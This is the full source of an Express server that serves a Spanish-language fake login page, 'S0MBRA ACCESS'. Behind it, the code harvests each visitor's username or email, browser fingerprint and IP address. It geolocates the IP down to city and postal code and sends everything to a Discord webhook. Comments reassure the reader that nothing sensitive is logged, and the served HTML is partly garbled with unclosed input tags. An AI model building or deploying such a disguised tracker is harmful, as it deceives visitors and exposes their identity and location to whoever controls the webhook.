import express from "express";

const app = express();

app.use(express.json());

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;

app.get("/", (req, res) => {
res.send(`<!DOCTYPE html>

<html lang="es">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"><title>S0MBRA ACCESS</title><style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;

  display: flex;
  justify-content: center;
  align-items: center;

  overflow: hidden;

  background:
    radial-gradient(
      circle at 50% 40%,
      #181818 0%,
      #080808 45%,
      #000 100%
    );

  color: white;
  font-family: Arial, sans-serif;
}

/* AURA */

body::before {
  content: "";

  position: fixed;

  width: 450px;
  height: 450px;

  border-radius: 50%;

  background: rgba(255,255,255,0.025);

  filter: blur(70px);

  animation:
    aura 7s ease-in-out infinite alternate;

  pointer-events: none;
}

@keyframes aura {

  0% {
    transform:
      scale(.8)
      translate(-100px,-50px);

    opacity: .3;
  }

  100% {
    transform:
      scale(1.3)
      translate(100px,50px);

    opacity: .7;
  }

}

/* PANEL */

.container {

  position: relative;

  width: 90%;
  max-width: 390px;

  padding: 30px;

  background: rgba(17,17,17,.88);

  border: 1px solid #292929;

  border-radius: 18px;

  text-align: center;

  box-shadow:
    0 0 30px rgba(255,255,255,.05),
    0 20px 60px rgba(0,0,0,.6);

  animation:
    panelIn .7s cubic-bezier(.2,.8,.2,1);

  backdrop-filter: blur(12px);
}

@keyframes panelIn {

  from {
    opacity: 0;
    transform:
      translateY(35px)
      scale(.92);
  }

  to {
    opacity: 1;
    transform:
      translateY(0)
      scale(1);
  }

}

/* BORDE */

.container::after {

  content: "";

  position: absolute;

  inset: -1px;

  border-radius: 18px;

  pointer-events: none;

  border: 1px solid transparent;

  animation:
    borderPulse 3s ease-in-out infinite;
}

@keyframes borderPulse {

  0%,100% {
    opacity: .15;
  }

  50% {
    opacity: .5;
  }

}

/* LOGO */

.logo {

  font-size: 32px;

  font-weight: bold;

  letter-spacing: 5px;

  margin-bottom: 25px;

  animation:
    logoIn .9s ease,
    logoGlow 2.5s ease-in-out infinite alternate;
}

@keyframes logoIn {

  from {
    opacity: 0;

    transform:
      scale(.6);

    letter-spacing: 15px;
  }

  to {
    opacity: 1;

    transform:
      scale(1);

    letter-spacing: 5px;
  }

}

@keyframes logoGlow {

  from {
    text-shadow:
      0 0 2px rgba(255,255,255,.2);
  }

  to {
    text-shadow:
      0 0 8px rgba(255,255,255,.35),
      0 0 25px rgba(255,255,255,.12);
  }

}

/* LABEL */

.label {

  display: block;

  text-align: left;

  margin:
    12px 0 7px;

  color: #aaa;

  font-size: 14px;

  animation:
    fadeUp .7s ease both;
}

@keyframes fadeUp {

  from {
    opacity: 0;
    transform:
      translateY(8px);
  }

  to {
    opacity: 1;
    transform:
      translateY(0);
  }

}

/* INPUT */

input {

  width: 100%;

  padding: 14px;

  border-radius: 10px;

  border: 1px solid #333;

  background: #080808;

  color: white;

  outline: none;

  text-align: center;

  font-size: 16px;

  transition:
    border-color .25s ease,
    box-shadow .25s ease,
    transform .2s ease,
    background .25s ease;
}

input:hover {
  border-color: #555;
}

input:focus {

  border-color: #888;

  background: #0d0d0d;

  transform:
    translateY(-2px);

  box-shadow:
    0 0 0 3px rgba(255,255,255,.04),
    0 0 20px rgba(255,255,255,.05);
}

/* BOTÓN */

button {

  width: 100%;

  margin-top: 20px;

  padding: 14px;

  border: 0;

  border-radius: 10px;

  background: white;

  color: black;

  font-size: 16px;

  font-weight: bold;

  cursor: pointer;

  position: relative;

  overflow: hidden;

  transition:
    transform .2s ease,
    box-shadow .2s ease;
}

button::before {

  content: "";

  position: absolute;

  top: 0;

  left: -100%;

  width: 70%;

  height: 100%;

  background:
    linear-gradient(
      90deg,
      transparent,
      rgba(255,255,255,.7),
      transparent
    );

  transform:
    skewX(-20deg);
}

button:hover {

  transform:
    translateY(-2px);

  box-shadow:
    0 8px 25px rgba(255,255,255,.12);
}

button:hover::before {
  animation:
    buttonShine .7s ease;
}

button:active {

  transform:
    scale(.97);
}

@keyframes buttonShine {

  from {
    left: -100%;
  }

  to {
    left: 140%;
  }

}

/* ESTADO */

#status {

  margin-top: 18px;

  min-height: 22px;

  color: #aaa;

  word-break: break-word;

}

.status-show {

  animation:
    statusIn .45s ease;
}

@keyframes statusIn {

  from {
    opacity: 0;

    transform:
      translateY(10px);
  }

  to {
    opacity: 1;

    transform:
      translateY(0);
  }

}

</style></head><body><div class="container">  <div class="logo">
    S0MBRA
  </div>  <label class="label">
    USUARIO / CORREO
  </label><input
id="usuario"
type="text"
placeholder="Ingresá tu usuario"
autocomplete="off"

«»

  <label class="label">
    CLAVE DE PRUEBA
  </label><input
id="clave"
type="text"
placeholder="Ingresá una clave de prueba"
autocomplete="off"

«»

  <button onclick="access()">
    ENTRAR
  </button>  <div id="status"></div></div><script>

function mostrarEstado(texto) {

  const status =
    document.getElementById("status");

  status.classList.remove("status-show");

  /*
    Reinicia la animación cada vez
    que cambia el mensaje.
  */

  void status.offsetWidth;

  status.textContent = texto;

  status.classList.add("status-show");
}


async function access() {

  const usuario =
    document
      .getElementById("usuario")
      .value
      .trim();

  const clave =
    document
      .getElementById("clave")
      .value
      .trim();


  if (!usuario || !clave) {

    mostrarEstado(
      "⚠️ Completá los dos campos"
    );

    return;
  }


  mostrarEstado(
    "⏳ Procesando..."
  );


  const datosTecnicos = {

    navegador:
      navigator.userAgent,

    plataforma:
      navigator.platform,

    idioma:
      navigator.language,

    zonaHoraria:
      Intl.DateTimeFormat()
        .resolvedOptions()
        .timeZone,

    pantalla:
      window.screen.width +
      "x" +
      window.screen.height,

    horaLocal:
      new Date().toISOString()

  };


  try {

    /*
      La clave es únicamente de prueba.

      No se envía al servidor.
    */

    const response =
      await fetch("/access", {

        method: "POST",

        headers: {
          "Content-Type":
            "application/json"
        },

        body: JSON.stringify({

          usuario:
            usuario,

          datosTecnicos:
            datosTecnicos

        })

      });


    const data =
      await response.json();


    if (data.success) {

      mostrarEstado(

        "✅ ACCESO PROCESADO\\n" +

        "👤 Usuario: " +
        usuario +

        "\\n🔐 Clave de prueba: " +
        clave +

        "\\n🌎 Ubicación aprox.: " +
        (data.ubicacion ||
          "No disponible")

      );

    } else {

      mostrarEstado(
        "❌ " +
        (data.message ||
          "Error")
      );

    }

  } catch (error) {

    console.error(error);

    mostrarEstado(
      "❌ Error de conexión"
    );

  }

}

</script></body>
</html>`);
});app.post("/access", async (req, res) => {

try {

const usuario =
  String(
    req.body?.usuario || ""
  ).trim();

const datosTecnicos =
  req.body?.datosTecnicos || {};


if (!usuario) {

  return res.status(400).json({

    success: false,

    message:
      "Ingresá un usuario o correo"

  });

}


if (!DISCORD_WEBHOOK) {

  return res.status(500).json({

    success: false,

    message:
      "Webhook no configurado"

  });

}


const forwarded =
  req.headers["x-forwarded-for"];

const ip =
  forwarded
    ? String(forwarded)
        .split(",")[0]
        .trim()
    : req.socket.remoteAddress;


let ubicacion = {

  pais:
    "No disponible",

  region:
    "No disponible",

  ciudad:
    "No disponible",

  postal:
    "No disponible",

  codigoPais:
    "No disponible",

  zonaHoraria:
    datosTecnicos.zonaHoraria ||
    "No disponible"

};


try {

  const geoResponse =
    await fetch(
      "https://ipapi.co/" +
      encodeURIComponent(ip) +
      "/json/"
    );


  if (geoResponse.ok) {

    const geo =
      await geoResponse.json();


    ubicacion = {

      pais:
        geo.country_name ||
        "No disponible",

      region:
        geo.region ||
        "No disponible",

      ciudad:
        geo.city ||
        "No disponible",

      postal:
        geo.postal ||
        "No disponible",

      codigoPais:
        geo.country_code ||
        "No disponible",

      zonaHoraria:
        geo.timezone ||
        datosTecnicos.zonaHoraria ||
        "No disponible"

    };

  }

} catch {

  console.log(
    "Ubicación aproximada no disponible."
  );

}


/*
  Discord recibe información técnica
  no sensible. No se registra ninguna
  contraseña, cookie o token.
*/

await fetch(
  DISCORD_WEBHOOK,
  {

    method: "POST",

    headers: {
      "Content-Type":
        "application/json"
    },

    body: JSON.stringify({

      username:
        "S0MBRA ACCESS",

      embeds: [

        {

          title:
            "🟢 S0MBRA ACCESS",

          fields: [

            {
              name:
                "👤 Usuario / Correo",

              value:
                usuario
            },

            {
              name:
                "🌎 País",

              value:
                ubicacion.pais
            },

            {
              name:
                "📍 Región",

              value:
                ubicacion.region
            },

            {
              name:
                "🏙️ Ciudad aproximada",

              value:
                ubicacion.ciudad
            },

            {
              name:
                "📮 Código postal aprox.",

              value:
                ubicacion.postal
            },

            {
              name:
                "📱 Plataforma",

              value:
                String(
                  datosTecnicos.plataforma ||
                  "No disponible"
                ).slice(0, 1000)
            },

            {
              name:
                "🌐 Navegador",

              value:
                String(
                  datosTecnicos.navegador ||
                  "No disponible"
                ).slice(0, 1000)
            },

            {
              name:
                "🗣️ Idioma",

              value:
                String(
                  datosTecnicos.idioma ||
                  "No disponible"
                )
            },

            {
              name:
                "🖥️ Pantalla",

              value:
                String(
                  datosTecnicos.pantalla ||
                  "No disponible"
                )
            },

            {
              name:
                "🕐 Hora",

              value:
                String(
                  datosTecnicos.horaLocal ||
                  "No disponible"
                )
            },

            {
              name:
                "🔐 Clave",

              value:
                "CLAVE DE PRUEBA NO REGISTRADA"
            }

          ],

          timestamp:
            new Date().toISOString()

        }

      ]

    })

  }
);


res.json({

  success:
    true,

  ubicacion:

    ubicacion.ciudad !==
    "No disponible"

      ? ubicacion.ciudad +
        ", " +
        ubicacion.region +
        ", " +
        ubicacion.pais

      : ubicacion.pais

});

} catch (error) {

console.error(error);

res.status(500).json({

  success:
    false,

  message:
    "Error interno"

});

}

});

app.listen(
PORT,
"0.0.0.0",
() => {

console.log(
  \`S0MBRA Access funcionando en puerto \${PORT}\`
);

}
);
